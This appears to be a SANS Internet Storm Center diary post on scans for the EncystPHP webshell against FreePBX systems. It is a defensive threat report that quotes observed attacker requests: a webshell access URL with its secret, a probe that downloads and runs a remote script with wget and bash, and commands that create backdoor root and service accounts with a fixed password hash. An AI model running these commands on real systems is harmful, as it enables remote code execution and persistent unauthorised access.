---
ai_commentary: []
ai_commentary_meta:
  content_digest: ''
  generated_at: ''
  model: ''
  prompt_version: ''
  provider: ''
category: ai-security
date: '2026-04-13T14:15:18.134951+00:00'
exported_at: '2026-04-13T14:15:20.318626+00:00'
feed: https://isc.sans.edu/rssfeed.xml
language: en
source_url: https://isc.sans.edu/diary/rss/32892
structured_data:
  about: []
  author: ''
  description: 'Scans for EncystPHP Webshell, Author: Johannes Ullrich'
  headline: Scans for EncystPHP Webshell, (Mon, Apr 13th)
  inLanguage: en
  keywords: []
  main_image: ''
  original_source: https://isc.sans.edu/diary/rss/32892
  publisher:
    logo: /favicon.ico
    name: GTCode
title: Scans for EncystPHP Webshell, (Mon, Apr 13th)
updated_at: '2026-04-13T14:15:18.134951+00:00'
url_hash: 67ad0ea8933594b0a9d36bfed6e189865d93f5eb
---

Last week, I wrote about attackers scanning for various webshells, hoping to find some that do not require authentication or others that use well-known credentials. But some attackers are paying attention and are deploying webshells with more difficult-to-guess credentials. Today, I noticed some scans for what appears to be the "EncystPHP" web shell. Fortinet wrote about this webshell back in January. It appears to be a favorite among attackers compromising vulnerable FreePBX systems.

The requests I observed look like:

> `GET /admin/modules/phones/ajax.php?md5=cf710203400b8c466e6dfcafcf36a411
>
> Host: [victim ip address]:8000
>
> User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
>
> Accept-Encoding: gzip, deflate
>
> Accept: */*
>
> Connection: keep-alive`

This URL matches what
[Fortinet reported](https://www.fortinet.com/de/blog/threat-research/unveiling-the-weaponized-web-shell-encystphp)
back in January.

The parameter name "md5" is a bit misleading. The webshell will just compare the string. The parameter is not necessarily the MD5 hash of a specific "password"; any string will work as long as it matches the hard-coded string in the webshell. The string above has the correct length for an MD5 hash, but I wasn't able to find it in common MD5 hash databases. It is very possible that only a few different values are used across different attack campaigns. Many attackers may just "copy/paste" the code, including this access secret.

Currently, these probes originate from
[160.119.76.250](/ipinfo.html?ip=160.119.76.250)
, an IP address located in the Netherlands. The IP address hosts an unconfigured web server.

The same IP address is also probing for various FreePBX vulnerabilities, for example:

> `/restapps/applications.php?linestate=$$LINESTATE$$&user=100
>
> Context: ext-local`
>
> `Action: Originate
>
> Channel: Local/DONTCALL@macro-dial
>
> Application: system
>
> data: wget http://45.95.147.178/k.php -O /tmp/k;bash /tmp/`
> k

This request also matches the scans reported by Fortinet, and it returns the EncystPHP webshell. This version is also adding the following backdoor accounts:

> `echo 'root:$1$nRz1Cbtk$6DnGs37n.OpPcgejUfp9p.' | chpasswd -e 2>/dev/null || true
>
> echo 'hima:$1$nRz1Cbtk$6DnGs37n.OpPcgejUfp9p.' | chpasswd -e 2>/dev/null || true
>
> echo 'asterisk:$1$nRz1Cbtk$6DnGs37n.OpPcgejUfp9p.' | chpasswd -e 2>/dev/null || true
>
> echo 'sugarmaint:$1$nRz1Cbtk$6DnGs37n.OpPcgejUfp9p.' | chpasswd -e 2>/dev/null || true
>
> echo 'spamfilter:$1$nRz1Cbtk$6DnGs37n.OpPcgejUfp9p.' | chpasswd -e 2>/dev/null || true
>
> echo 'asteriskuser:$1$nRz1Cbtk$6DnGs37n.OpPcgejUfp9p.' | chpasswd -e 2>/dev/null || true
>
> echo 'supports:$1$nRz1Cbtk$6DnGs37n.OpPcgejUfp9p.' | chpasswd -e 2>/dev/null || true
>
> echo 'freepbxuser:$1$nRz1Cbtk$6DnGs37n.OpPcgejUfp9p.' | chpasswd -e 2>/dev/null || true
>
> echo 'supermaint:$1$nRz1Cbtk$6DnGs37n.OpPcgejUfp9p.' | chpasswd -e 2>/dev/null || true
>
> echo 'juba:$1$nRz1Cbtk$6DnGs37n.OpPcgejUfp9p.' | chpasswd -e 2>/dev/null || true`

If you are using FreePBX, you may want to check for these accounts just to make sure.

--

Johannes B. Ullrich, Ph.D. , Dean of Research,
[SANS.edu](https://sans.edu)

[Twitter](https://jbu.me/164)
|